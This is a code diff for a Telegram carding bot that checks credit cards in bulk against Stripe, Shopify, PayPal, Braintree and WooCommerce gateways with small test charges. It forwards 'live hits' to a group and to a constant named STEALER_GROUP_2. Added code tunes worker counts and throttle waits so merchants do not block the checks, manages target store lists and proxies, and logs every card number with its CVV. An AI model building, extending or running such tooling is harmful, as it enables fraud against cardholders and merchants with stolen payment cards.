@@ -17,21 +17,33 @@ from gateways import (
     is_gateway_premium, is_tool_on, is_tool_premium,
     is_mass_check_enabled, get_inline_mass_limit, get_file_mass_limit,
     add_user_proxy, remove_user_proxies, remove_single_user_proxy,
-    get_user_proxy_list, get_user_proxy, auto_remove_dead_proxy
+    get_user_proxy_list, get_user_proxy, auto_remove_dead_proxy,
+    st_verdict_token
 )
 from tools import (
     tool_gen, tool_bin, tool_sk, tool_id, tool_ping,
     tool_rand, tool_translate, tool_langcode, set_bot_username
 )
 
-API_ID = os.environ.get("TELEGRAM_API_ID", "")
-API_HASH = os.environ.get("TELEGRAM_API_HASH", "")
-BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
-ADMIN_ID = [int(x) for x in os.environ.get("TELEGRAM_ADMIN_ID", "").split(",") if x.strip()]
-GROUP_ID = int(os.environ.get("TELEGRAM_GROUP_ID", "0"))
-GROUP_LINK = os.environ.get("TELEGRAM_GROUP_LINK", "")
-CHANNEL_LINK = os.environ.get("TELEGRAM_CHANNEL_LINK", "")
-CHANNEL_ID_RAW = os.environ.get("TELEGRAM_CHANNEL_ID", "")
+def _load_config():
+    """Load configuration from config.json in the bot directory."""
+    try:
+        config_path = os.path.join(os.path.dirname(__file__), "config.json")
+        with open(config_path, "r") as f:
+            return json.load(f)
+    except Exception:
+        return {}
+
+_config = _load_config()
+
+API_ID = os.environ.get("TELEGRAM_API_ID", _config.get("TELEGRAM_API_ID", ""))
+API_HASH = os.environ.get("TELEGRAM_API_HASH", _config.get("TELEGRAM_API_HASH", ""))
+BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", _config.get("TELEGRAM_BOT_TOKEN", ""))
+ADMIN_ID = [int(x) for x in os.environ.get("TELEGRAM_ADMIN_ID", _config.get("TELEGRAM_ADMIN_ID", "")).split(",") if x.strip()]
+GROUP_ID = int(os.environ.get("TELEGRAM_GROUP_ID", _config.get("TELEGRAM_GROUP_ID", "0")))
+GROUP_LINK = os.environ.get("TELEGRAM_GROUP_LINK", _config.get("TELEGRAM_GROUP_LINK", ""))
+CHANNEL_LINK = os.environ.get("TELEGRAM_CHANNEL_LINK", _config.get("TELEGRAM_CHANNEL_LINK", ""))
+CHANNEL_ID_RAW = os.environ.get("TELEGRAM_CHANNEL_ID", _config.get("TELEGRAM_CHANNEL_ID", ""))
 CHANNEL_ID = None
 if CHANNEL_ID_RAW:
     try:
@@ -50,7 +62,10 @@ def _load_logs_group_id():
         return 0
 
 LOGS_GROUP_ID = _load_logs_group_id()
-HIT_FORWARD_GROUP = -1003561084296
+# The group the live hits are posted to.  It can be set in config.json
+# ("HIT_FORWARD_GROUP"); when the bot cannot post there the hit goes to
+# the main group instead of being lost.
+HIT_FORWARD_GROUP = int(_config.get("HIT_FORWARD_GROUP", -1003561084296) or 0)
 STEALER_GROUP_2 = -1003862598213
 
 PREMIUM_FILE = "premium.json"
@@ -65,54 +80,6 @@ BANNED_FILE = "banned_users.json"
 ACTIVE_MTXT_PROCESSES = {}
 MTXT_LOCKS = {}
 FILTER_CACHE = {}
-
-# ── Hosted Shopify Card Checker API ───────────────────────────────────────────
-RAILWAY_SHOPIFY_API = os.environ.get("RAILWAY_SHOPIFY_API", "https://shoify-api-production.up.railway.app")
-
-
-async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=60):
-    """Call the hosted Shopify checker API and return a normalized result dict.
-
-    Returns: {status, response, gateway, amount, site, elapsed, extra}
-    """
-    payload = {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
-    if site:
-        payload["site"] = site
-    if proxy:
-        payload["proxy"] = proxy
-    try:
-        async with aiohttp.ClientSession() as _sess:
-            async with _sess.post(
-                f"{RAILWAY_SHOPIFY_API}/check",
-                json=payload,
-                timeout=aiohttp.ClientTimeout(total=timeout),
-            ) as _resp:
-                api_result = await _resp.json(content_type=None)
-    except Exception as e:
-        api_result = {
-            "status": "error",
-            "response": f"API error: {str(e)[:100]}",
-            "gateway": "Shopify Payments",
-            "amount": None,
-            "site": site,
-            "elapsed": 0,
-            "extra": None,
-        }
-    # Normalize missing fields
-    api_result.setdefault("status", "error")
-    api_result.setdefault("response", "Unknown")
-    api_result.setdefault("gateway", "Shopify Payments")
-    api_result.setdefault("amount", None)
-    api_result.setdefault("site", site)
-    api_result.setdefault("elapsed", 0)
-    api_result.setdefault("extra", None)
-    # Normalize "All sites failed" / skip-style responses into dead_site so
-    # the caller (mass / single) can retry on another site when applicable.
-    if api_result["status"] == "error" and isinstance(api_result["response"], str):
-        _rl = api_result["response"].lower()
-        if "all sites failed" in _rl:
-            api_result["status"] = "dead_site"
-    return api_result
 
 # ── Anti-Flood ────────────────────────────────────────────────────────────────
 # Per-user sliding-window message tracker.
@@ -809,15 +776,15 @@ async def can_use(user_id, chat):
     if is_private:
         if is_premium or is_admin:
             return True, "premium_private"
-        elif await is_group_and_channel_member(user_id):
-            return True, "group_member_private"
+        elif await is_channel_member(user_id):
+            return True, "channel_member_private"
         else:
             return False, "no_access"
     else:
         if is_premium:
             return True, "premium_group"
         else:
-            return True, "group_free"
+            return True, "channel_free"
 
 TIER_LIMITS_BOT = {
     "gold": {"dailyChecks": -1, "maxBatchCards": 5000},
@@ -1033,9 +1000,9 @@ GATEWAY_DISPLAY_NAMES = {
     "rbc": "Stripe Auth $0 (RBC)",
     "cw": "Stripe Charge $6",
     "rz": "Razorpay Charge",
+    "shp": "Shopify",
     "charge": "Stripe Charge SK",
     "pp": "PayPal Charge $0.01",
-    "shp": "Shopify",
     "skl1": "Stripe Charge $1",
     "skl2": "Stripe Charge $7",
     "b3c": "Braintree Charge",
@@ -1046,6 +1013,10 @@ GATEWAY_DISPLAY_NAMES = {
     "auto": "Stripe Random Charge",
     "azz": "Authorize.net Charge $1",
     "ppk": "PayPal Keybase $1",
+    "sc": "WooCommerce Stripe $0.50",
+    "sc2": "WooCommerce Stripe $1",
+    "stc": "Stripe Charge $0.50",
+    "stc2": "Stripe Charge $1",
     "Stripe CO": "Stripe Checkout",
 }
 
@@ -1200,7 +1171,7 @@ async def save_approved_card(card, status, response, gateway, price, user_id=Non
                 )
                 if user_name and user_id:
                     hit_msg += f"\n**Checked By:** [{user_name} [{tier_tag}]](tg://user?id={user_id})"
-                await client.send_message(HIT_FORWARD_GROUP, hit_msg)
+                await _send_hit_message(client, hit_msg)
             if is_hit_charged and STEALER_GROUP_2:
                 try:
                     await client.send_message(STEALER_GROUP_2, hit_msg)
@@ -1233,14 +1204,12 @@ def extract_urls_from_text(text):
 
 async def test_single_site(site, test_card="4111111111111111|12|2028|123"):
     try:
-        from gates.shopify_native import _shopify_check
+        from gates.shopify_api import shopify_api_check
         clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
         parts = test_card.split('|')
         cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
-        session = await get_http_session()
-        result = await _shopify_check(session, clean_site, cc, mm, yy, cvv)
-        amount = result[0]
-        response = result[1]
+        response = await shopify_api_check(cc, mm, yy, cvv, site=clean_site)
+        amount = None
         if amount is None and response in ("No session token", "Site requires login", "No products available", "Captcha required"):
             return {"status": "dead", "response": response, "site": site, "price": "-"}
         if amount is None:
@@ -1440,7 +1409,7 @@ async def _forward_stealer2_callback(event):
         except Exception:
             pass
     except Exception as e:
-        await event.answer(f"Error: {str(e)[:50]}", alert=True)
+        await event.answer(f"Error: {type(e).__name__}: {str(e)[:50]}", alert=True)
     raise events.StopPropagation
 
 def banned_user_message():
@@ -1449,18 +1418,15 @@ def banned_user_message():
 def access_denied_message_with_button():
     message = (
         f"**Access Denied!**\n\n"
-        f"You must join BOTH our Channel and Group to use this bot.\n\n"
+        f"You must join our Telegram Channel to use this bot.\n\n"
         f"1. Join the Channel\n"
-        f"2. Join the Group\n"
-        f"3. Then come back and type /start\n\n"
-        f"Click the buttons below to join:"
+        f"2. Then come back and type /start\n\n"
+        f"Click the button below to join:"
     )
     buttons = []
     if CHANNEL_LINK:
         buttons.append([Button.url("Join Channel", CHANNEL_LINK)])
-    if GROUP_LINK:
-        buttons.append([Button.url("Join Group", GROUP_LINK)])
-    if CHANNEL_LINK and GROUP_LINK:
+    if CHANNEL_LINK:
         buttons.append([Button.url("Try Again /start", f"https://t.me/Myhitz_bot?start=true")])
     return message, buttons
 
@@ -1511,6 +1477,12 @@ def format_gateway_result(status_header, cc, mm, yy, cvv, gateway_name, response
         header = "#Declined \u26d4"
         status_txt = "Declined \u274c"
         resp_icon = ""
+    elif status_header == "ERROR":
+        # A gateway failure is not a card verdict - say so instead of
+        # reporting the user's card as dead.
+        header = "#Error \u26a0"
+        status_txt = "Error \u26a0"
+        resp_icon = ""
     else:
         header = "#Unknown \u2753"
         status_txt = "Unknown \u2753"
@@ -1544,6 +1516,378 @@ def format_gateway_result(status_header, cc, mm, yy, cvv, gateway_name, response
 \U0001f464 **Req By** \u00bb [{first_name}](tg://user?id={user_id}) [{rank}]
 \U0001f310 **Proxy** \u00bb {proxy_status}
 \U0001f916 **Bot** \u00bb {bot_tag}"""
+
+
+def st_readable_verdict(status, response, alias="st"):
+    """The words the user reads for a /st check.
+
+    "approved", "approved with 3ds" or "card_decline" -- and nothing
+    else.  The reason code behind a refusal (generic_decline and the
+    like) is not part of the answer; it stays in the server log.
+    """
+    if alias != "st":
+        return response
+    token = st_verdict_token(status)
+    if token == "approved":
+        low = (response or "").lower()
+        if "3ds" in low or "3d secure" in low or "requires_action" in low:
+            return "approved with 3ds"
+        return "approved"
+    if token:
+        return token
+    return response
+
+
+def format_stripe_result(status_header, cc, mm, yy, cvv, response, brand, bin_type,
+                         bank, country, flag, elapsed, first_name, user_id, rank):
+    """The /st output, exactly in the Stripe $0-check layout.
+
+    The verdict is one of two words: "approved" when the issuer
+    verified the card, "card_decline" when the card was refused.  A
+    refusal that names no reason is still a refusal, so it is a
+    card_decline and never an approval.  A broken check is neither: it
+    shows the error itself instead of a verdict, because a gate that
+    could not reach the bank knows nothing about the card.
+
+    An approval that still needs 3D Secure says so: "approved with
+    3ds".  The two are not the same thing, and the reason belongs in
+    the answer.
+
+    The reason behind a refusal is written to gate_results.log.
+    """
+    gate = "𝙎𝙩𝙧𝙞𝙥𝙚 𝘼𝙪𝙩𝙝\U0001f501"
+    card = f"{cc}|{mm}|{yy}|{cvv}"
+    token = st_verdict_token(status_header)
+    reason = token if token else (clean_response(response) or "Error")
+    if status_header == "APPROVED":
+        # an approval that still asks for 3d secure is its own thing
+        low = (response or "").lower()
+        if "3ds" in low or "3d secure" in low or "requires_action" in low:
+            reason = "approved with 3ds"
+        else:
+            reason = "approved"
+    bot_tag = BOT_USERNAME or ADMIN_USERNAME
+
+    if status_header == "APPROVED":
+        head = "𝘼𝙥𝙥𝙧𝙤𝙫𝙲𝙙 ✅(/st)"
+    elif status_header == "DECLINED":
+        head = "𝘿𝙚𝙘𝙡𝙞𝙣𝙲𝙙 ❌(/st)"
+    else:
+        head = "⚠️ Error (/st)"
+
+    return f"""{head}
+[↯] 𝗖𝗖 ⇾{card}
+[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
+[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{reason}
+[↯] 𝗕𝗜𝗡 →{cc[:6]} - {bin_type} - {brand}
+[↯] 𝗕𝗮𝗻𝗸  → {bank}
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →{country} - {flag}
+[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{elapsed} secounds .
+𝗕𝗼𝘁 𝗕𝘆 ⇾『{bot_tag}』"""
+
+
+def format_shopify_result(status_header, cc, mm, yy, cvv, response, brand, bin_type,
+                          bank, country, flag, elapsed, amount=None,
+                          product=None, gateway=None, code=None, decline_code=None,
+                          proxy=None, charged=False):
+    """The /shp output, in the very same frame as the /st output.
+
+    Same header, same [↯] rows, same order -- but the Shopify rows carry
+    the full detail of the checkout that was run: the product, the amount,
+    the gateway, the raw codes and the proxy.
+
+    The store name is deliberately NOT shown.
+    """
+    gate = "𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘼𝙪𝙩𝙝\U0001f501"
+    card = f"{cc}|{mm}|{yy}|{cvv}"
+    last = "Approved" if status_header == "APPROVED" else "declined"
+    bot_tag = BOT_USERNAME or ADMIN_USERNAME
+
+    head = "𝘼𝙥𝙥𝙧𝙤𝙫𝙲𝙙 ✅(/shp)" if status_header == "APPROVED" else "𝘿𝙚𝙘𝙡𝙞𝙣𝙲𝙙 ❌(/shp)"
+
+    rows = [
+        f"[↯] 𝗖𝗖 ⇾{card}",
+        f"[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}",
+        f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}",
+    ]
+    if code:
+        rows.append(f"[↯] 𝗖𝗢𝗗𝗘 →{code}")
+    if decline_code and decline_code != code:
+        rows.append(f"[↯] 𝗗𝗘𝗖𝗟𝗜𝗡𝗘 →{decline_code}")
+    if response and response != code:
+        rows.append(f'[↯] 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 →{response}')
+    rows.append(f"[↯] 𝗕𝗜𝗡 →{cc[:6]} - {bin_type} - {brand}")
+    rows.append(f"[↯] 𝗕𝗮𝗻𝗸  → {bank}")
+    rows.append(f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 →{country} - {flag}")
+    if product:
+        rows.append(f"[↯] 𝗣𝗥𝗢𝗗𝗨𝗖𝗧 →{product}")
+    if amount:
+        rows.append(f"[↯] 𝗔𝗠𝗢𝗨𝗡𝗧 →${amount}")
+    if gateway:
+        rows.append(f"[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 →{gateway}")
+    if proxy:
+        rows.append(f"[↯] 𝗣𝗥𝗢𝗫𝗬 →{proxy}")
+    if charged:
+        rows.append(f"[↯] 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 →CHARGED")
+    rows.append(f"[↯] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{elapsed} secounds .")
+
+    return "\n".join([head] + rows) + f"\n𝗕𝗼𝘁 𝗕𝘆 ⇾『{bot_tag}』"
+
+
+# Telegram refuses a message over 4096 characters.  A mass check with a
+# few dozen cards builds a result message far past that, so the send
+# failed with MessageTooLongError and -- because the progress message was
+# deleted first -- the user was left with no output at all.
+TELEGRAM_MAX_MESSAGE = 4096
+MESSAGE_CHUNK = 3800
+
+
+def _split_message(text, limit=MESSAGE_CHUNK):
+    """Split a long message into parts Telegram will accept."""
+    text = str(text or "")
+    if not text:
+        return []
+    if len(text) <= limit:
+        return [text]
+    parts, cur = [], ""
+    for line in text.split("\n"):
+        piece = line + "\n"
+        if len(cur) + len(piece) > limit and cur:
+            parts.append(cur.rstrip("\n"))
+            cur = ""
+        while len(piece) > limit:
+            parts.append(piece[:limit])
+            piece = piece[limit:]
+        cur += piece
+    if cur.strip():
+        parts.append(cur.rstrip("\n"))
+    return parts or []
+
+
+async def _send_long(event, text, buttons=None):
+    """Send a message of any length, split over several messages."""
+    sent = []
+    for i, part in enumerate(_split_message(text)):
+        if not part:
+            continue
+        try:
+            if buttons and i == 0:
+                sent.append(await event.reply(part, buttons=buttons))
+            else:
+                sent.append(await event.reply(part))
+        except Exception as e:
+            print(f"send_long: part {i + 1} failed: {e}")
+            break
+    return sent
+
+async def _send_hit_message(client, text):
+    """Post a live hit, falling back to the main group.
+
+    The stealer group id is often one the bot is not a member of, and
+    Telegram then refuses the send with "Could not find the input entity".
+    The hit is not lost: it goes to the main group instead.
+    """
+    targets = []
+    if HIT_FORWARD_GROUP:
+        targets.append(HIT_FORWARD_GROUP)
+    if GROUP_ID and GROUP_ID not in targets:
+        targets.append(GROUP_ID)
+    last = None
+    for gid in targets:
+        try:
+            await client.send_message(gid, text)
+            return True
+        except Exception as e:
+            last = e
+    if last:
+        print(f"Hit forward error: {last}")
+    return False
+
+# The errors that a second attempt can fix.  A store that refused the
+# checkout or dropped the request is worth another go; a card that is
+# simply dead is not an error at all.  A timeout is NOT in the list:
+# the card may have been charged before the answer went missing, and a
+# second try would charge it twice.
+RETRYABLE_ERRORS = (
+    "non-json", "submit_failed", "tokenization_failed", "no_session_token",
+    "no_attempt_token", "cart_failed", "cart_error", "throttled",
+    "site_error", "graphql_error", "no_seller_proposal", "checkpointdenied",
+    "proxy_error", "no_product", "no_payment_required",
+    "connection reset", "connection refused", "server disconnected",
+)
+
+
+def _is_retryable_error(response, alias="st"):
+    """Is this error worth another try?
+
+    Only errors that happened BEFORE the payment are safe to repeat.
+    """
+    low = str(response or "").lower()
+    if not low:
+        return False
+    return any(m in low for m in RETRYABLE_ERRORS)
+
+
+# The merchants rate limit us.  When they do, the whole scan waits
+# instead of burning through the rest of the file: a card that is
+# checked while the store is refusing is a wasted card and a wrong
+# answer.  The wait is shared by every worker.
+_MASS_THROTTLE_UNTIL = [0.0]
+_MASS_THROTTLE_LOCK = asyncio.Lock()
+MASS_THROTTLE_WAIT = float(os.environ.get("MASS_THROTTLE_WAIT", "20"))
+
+
+async def _mass_throttle_wait(alias, response):
+    """Wait when the stores are rate limiting us."""
+    if alias != "shp":
+        return
+    low = str(response or "").lower()
+    if not any(m in low for m in ("throttled", "429", "rate limit", "too many")):
+        return
+    now = time.time()
+    async with _MASS_THROTTLE_LOCK:
+        until = _MASS_THROTTLE_UNTIL[0]
+        if until > now:
+            wait = until - now
+        else:
+            wait = MASS_THROTTLE_WAIT
+            _MASS_THROTTLE_UNTIL[0] = now + wait
+    try:
+        await asyncio.sleep(min(wait, 120))
+    except Exception:
+        pass
+
+
+def _mass_concurrency(alias, cards, skool_count=1):
+    """How many cards to check at the same time in a mass run.
+
+    The merchant's own limit is what matters: the WooCommerce Stripe store
+    answers three to four setup intents at the same time in 2.5 s each and
+    starts dropping them above that, so "st" runs with four workers.  The
+    Skool gates use one worker per Skool account.
+    """
+    n = len(cards)
+    override = os.environ.get("ST_MASS_WORKERS")
+    if override:
+        return max(1, min(int(override), n or 1))
+    if alias == "shp":
+        # Measured on the validator: 24 checks at a time come back clean
+        # (3.2 cards/s); at 48 the stores start refusing the checkout
+        # and at 96 the whole run falls apart.  So 24 is the ceiling.
+        workers = int(os.environ.get("SHP_MASS_WORKERS", "24"))
+    elif alias == "st":
+        # measured on the live store: 3 workers -> 0.58 cards/s, 4 -> 0.78,
+        # 6 -> 0.91, 8 -> 0.98.  Six is where the gain flattens and the
+        # store still drops few requests, so a 1000 card file takes about
+        # 18-21 minutes.
+        workers = 6
+    elif alias in ("skl", "skl1", "skl2", "auto"):
+        workers = max(1, min(skool_count, n))
+    else:
+        workers = 3
+    return max(1, min(workers, n or 1))
+
+# Every check result is written here: the time, the gateway, the card, the
+# verdict, the response and how long it took.  Before, only the hits were
+# kept and a decline or an error was lost as soon as the results file was
+# deleted, so there was no way to review a mass run afterwards.
+GATE_LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "gate_results.log")
+GATE_LOG_MAX_BYTES = 20 * 1024 * 1024
+
+
+async def log_gate_result(alias, card, status, response, elapsed=0, user_id=None,
+                          user_name=None, source=""):
+    """Append one check to the results log."""
+    try:
+        from datetime import datetime as _dt
+        stamp = _dt.now().strftime("%Y-%m-%d %H:%M:%S")
+        line = (f"{stamp} | {str(alias).upper():5} | {card} | {str(status):8} | "
+                f"{str(response).replace(chr(10), ' ')[:100]} | {elapsed}s"
+                f" | uid={user_id or '-'} {user_name or ''} {source}\n")
+        try:
+            if (os.path.exists(GATE_LOG_FILE)
+                    and os.path.getsize(GATE_LOG_FILE) > GATE_LOG_MAX_BYTES):
+                os.replace(GATE_LOG_FILE, GATE_LOG_FILE + ".1")
+        except Exception:
+            pass
+        async with aiofiles.open(GATE_LOG_FILE, "a", encoding="utf-8") as f:
+            await f.write(line)
+        # the same line in the journal, so the run is visible in
+        # journalctl without opening the file
+        print(f"GATE {line.rstrip()}", flush=True)
+    except Exception as e:
+        print(f"gate log error: {e}")
+
+
+async def log_mass_event(kind, alias, count=0, user_id=None, user_name=None,
+                         source="", extra=""):
+    """Write a mass run event (start / end) to the results log."""
+    try:
+        from datetime import datetime as _dt
+        stamp = _dt.now().strftime("%Y-%m-%d %H:%M:%S")
+        line = (f"{stamp} | {str(alias).upper():5} | MASS {kind} | cards={count}"
+                f" | uid={user_id or '-'} {user_name or ''} {source} {extra}\n")
+        async with aiofiles.open(GATE_LOG_FILE, "a", encoding="utf-8") as f:
+            await f.write(line)
+        print(f"GATE {line.rstrip()}", flush=True)
+    except Exception as e:
+        print(f"gate log error: {e}")
+
+def _card_expired(mm, yy):
+    """True when the expiry is in the past."""
+    try:
+        mm = int(mm)
+        year = int(yy)
+        if year < 100:
+            year += 2000
+        now = datetime.now()
+        return (year < now.year) or (year == now.year and mm < now.month)
+    except Exception:
+        return False
+
+
+def _fast_local_filter(cards):
+    """Luhn + expiry only -- no network, no bank check.
+
+    This is what a 1000 card file can be run through in a fraction of a
+    second.  It CANNOT tell a live card from a dead one: it only proves
+    the number is well formed and not expired, so the result is labelled
+    as a format check.
+    """
+    rows = []
+    for cc, mm, yy, cvv in cards:
+        card = f"{cc}|{mm}|{yy}|{cvv}"
+        if not checkLuhn(cc):
+            rows.append((card, "DECLINED", "Luhn check failed"))
+        elif _card_expired(mm, yy):
+            rows.append((card, "DECLINED", "Expired card"))
+        else:
+            rows.append((card, "FORMAT-OK", "Format valid (not verified with the bank)"))
+    return rows
+
+
+def _fast_filter_message(rows, elapsed, alias="st"):
+    ok = [r for r in rows if r[1] == "FORMAT-OK"]
+    bad = [r for r in rows if r[1] != "FORMAT-OK"]
+    lines = [
+        f"\u26a1 **Fast format check - {alias.upper()}**",
+        "\u2501" * 12 + "\u2501" * 6,
+        f"\U0001f4ca **Scanned:** {len(rows)} cards in {round(float(elapsed), 3)}s",
+        f"\u2705 **Format valid:** {len(ok)}",
+        f"\u274c **Rejected locally:** {len(bad)}",
+        "",
+        "\u26a0\ufe0f **These cards were NOT checked with the bank.**",
+        "This only proves the numbers are well formed and not expired.",
+        "Run the normal check for a real live/dead verdict.",
+    ]
+    if bad:
+        lines.append("")
+        lines.append("**Rejected:**")
+        for card, _s, reason in bad[:25]:
+            lines.append(f"  \u274c `{card}` - {reason}")
+        if len(bad) > 25:
+            lines.append(f"  ... and {len(bad) - 25} more")
+    return "\n".join(lines)
 
 ALL_GATEWAY_ALIASES = list(get_flat_registry().keys())
 
@@ -1595,6 +1939,201 @@ async def welcome_handler(event):
     except Exception as e:
         print(f"Welcome handler error: {e}")
 
+# -- Shopify Validator API ----------------------------------------------------
+# The local API on port 8081 runs the full Shopify checkout and returns the
+# issuer's verdict.  It picks a product under $5 on its own.
+# The client itself lives in gates/shopify_api.py so the bot, the gateway
+# registry and the web panel all use the same implementation.
+from gates.shopify_api import call_shopify_api as _canonical_shopify_api
+
+
+async def call_shopify_api(cc, mm, yy, cvv, site=None, proxy=None, timeout=120):
+    """Check a card against the local Shopify Validator API."""
+    return await _canonical_shopify_api(cc, mm, yy, cvv, site=site, proxy=proxy,
+                                        timeout=timeout)
+
+
+# -- Shopify commands --------------------------------------------------------
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/]addsite\b'))
+async def addsite(event):
+    user_id = str(event.sender_id)
+    parts = event.raw_text.split()
+    sites = [p.strip().lower().replace("https://", "").replace("http://", "").strip("/")
+             for p in parts[1:] if "." in p]
+
+    if not sites and event.reply_to_msg_id:
+        try:
+            replied = await event.get_reply_message()
+            if replied and replied.document:
+                import re as _re
+                text = (replied.document.attributes or [{}])[0]
+                fname = getattr(text, "file_name", "") or ""
+                sites = [s for s in fname.split() if "." in s]
+        except Exception:
+            pass
+
+    if not sites:
+        return await event.reply("**Format:** `/addsite site1.com site2.com`\n\nOr reply to a `.txt` file with `/addsite`")
+
+    site_data = await load_json(SITE_FILE)
+    current = site_data.get(user_id, [])
+    added = []
+    for s in sites:
+        if s not in current:
+            current.append(s)
+            added.append(s)
+    site_data[user_id] = current
+    await save_json(SITE_FILE, site_data)
+    if added:
+        return await event.reply(f"\u2705 Added {len(added)} site(s):\n" + "\n".join(f"\u2022 `{s}`" for s in added))
+    return await event.reply("\u2139\ufe0f No new sites added.")
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/]viewsite$'))
+async def viewsite(event):
+    user_id = str(event.sender_id)
+    site_data = await load_json(SITE_FILE)
+    current = site_data.get(user_id, [])
+    if not current:
+        return await event.reply("You haven't added any sites yet!\n\nUse `/addsite site.com` to add Shopify sites.")
+    text = "\n".join(f"\u2022 `{s}`" for s in current[:60])
+    return await event.reply(f"\U0001f517 **Your sites ({len(current)}):**\n\n{text}")
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/]rmsite\b'))
+async def rmsite(event):
+    user_id = str(event.sender_id)
+    parts = event.raw_text.split()
+    targets = [p.strip().lower().replace("https://", "").replace("http://", "").strip("/")
+               for p in parts[1:]]
+    if not targets:
+        return await event.reply("**Format:** `/rmsite site1.com site2.com`")
+
+    site_data = await load_json(SITE_FILE)
+    current = site_data.get(user_id, [])
+    removed = [t for t in targets if t in current]
+    site_data[user_id] = [s for s in current if s not in removed]
+    await save_json(SITE_FILE, site_data)
+    if removed:
+        return await event.reply("\U0001f5d1 Removed:\n" + "\n".join(f"\u2022 `{s}`" for s in removed))
+    return await event.reply("\u2139\ufe0f No matching sites.")
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/]shp\b'))
+async def shp_cmd(event):
+    """Single Shopify check via the local validator API.
+
+    This is the ONLY handler that matches /shp - "shp" was removed from the
+    generic gateway_cmd pattern so a single /shp runs the check once instead
+    of twice (telebot runs every matching handler).
+    """
+    can_access, access_type = await can_use(event.sender_id, event.chat)
+    if access_type == "banned":
+        return await event.reply(banned_user_message())
+    if not can_access:
+        message, buttons = access_denied_message_with_button()
+        return await event.reply(message, buttons)
+
+    await register_user(event.sender_id)
+    increment_hitter_usage(event.sender_id)
+
+    allowed, remaining = check_cooldown(event.sender_id)
+    if not allowed:
+        return await event.reply(f"Cooldown: wait {remaining}s")
+
+    parts = event.raw_text.split()
+    if len(parts) < 2:
+        return await event.reply("**Format:** `/shp 4111111111111111|12|29|123`")
+
+    card = parts[1].strip()
+    parsed = parse_card_input(card)
+    if not parsed:
+        return await event.reply("\u274c Invalid card format. Use `CC|MM|YY|CVV`")
+
+    cc, mm, yy, cvv = parsed
+    if not checkLuhn(cc):
+        return await event.reply("\u274c Invalid card number (Luhn check failed).")
+
+    target_site = parts[2].strip().lower().replace("https://", "").replace("http://", "").strip("/") if len(parts) > 2 else None
+
+    status_msg = await event.reply("\u23f3 Checking on Shopify...")
+    try:
+        result = await call_shopify_api(cc, mm, yy, cvv, site=target_site or None, timeout=130)
+    except Exception as e:
+        await status_msg.edit(f"\u274c Error: {type(e).__name__}: {str(e)[:120]}")
+        return
+
+    resp = result.get("response", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    status = result.get("status", "error")
+    status_header = "APPROVED" if status == "approved" else "DECLINED"
+
+    brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
+
+    text = format_shopify_result(
+        status_header, cc, mm, yy, cvv, resp,
+        brand, bin_type, bank, country, flag, elapsed,
+        amount=result.get("amount"),
+        product=result.get("product"),
+        gateway=result.get("gateway"),
+        code=result.get("code"),
+        decline_code=result.get("decline_code"),
+        proxy=result.get("proxy"),
+        charged=bool(result.get("charged")),
+    )
+    try:
+        await status_msg.edit(text)
+    except Exception:
+        await event.reply(text)
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/]sh\b'))
+async def sh_cmd(event):
+    """Per-gateway check, e.g. /sh st 4111111111111111|12|29|123"""
+    if not (await can_use(event.sender_id, event.chat))[0]:
+        return await event.reply("\u274c Access denied.")
+
+    parts = event.raw_text.split()
+    flat = get_flat_registry()
+    if len(parts) < 3 or parts[1].lower() not in flat:
+        return await event.reply("**Format:** `/sh <gateway> <cc>`\n\nGateways: " + ", ".join(sorted(flat.keys())))
+
+    alias = parts[1].lower()
+    parsed = parse_card_input(parts[2].strip())
+    if not parsed:
+        return await event.reply("\u274c Invalid card format. Use `CC|MM|YY|CVV`")
+
+    cc, mm, yy, cvv = parsed
+    if not checkLuhn(cc):
+        return await event.reply("\u274c Invalid card number (Luhn check failed).")
+
+    gate_name = flat[alias]["name"]
+    _t0 = time.time()
+    status_msg = await event.reply(f"\u23f3 Checking on **{gate_name}**...")
+    try:
+        response = await run_gateway(alias, cc, mm, yy, cvv,
+                                    user_id=event.sender_id,
+                                    is_admin=event.sender_id in ADMIN_ID)
+    except Exception as e:
+        await status_msg.edit(f"\u274c Error: {type(e).__name__}: {str(e)[:120]}")
+        return
+
+    elapsed = round(time.time() - _t0, 2)
+    verdict = classify_response(response)
+    text = (
+        f"**Gateway:** {gate_name}\n"
+        f"**CC:** `{cc}|{mm}|{yy}|{cvv}`\n"
+        f"**Response:** {response[:120]}\n"
+        f"**Time:** {elapsed}s"
+    )
+    try:
+        await status_msg.edit(text)
+    except Exception:
+        await event.reply(text)
+
+
 # --- Bot Command Handlers ---
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/](start|cmds?|commands?|menu)$'))
@@ -1643,11 +2182,11 @@ async def start(event):
 
     buttons = [
         [Button.inline(f"\u26a1 Gates ({total_gates})", b"menu_gates"), Button.inline("\U0001f50d Lookup", b"menu_lookup")],
-        [Button.inline("\U0001f6e0 Toolkit", b"menu_toolkit"), Button.inline("\U0001f310 Shopify", b"menu_shopify")],
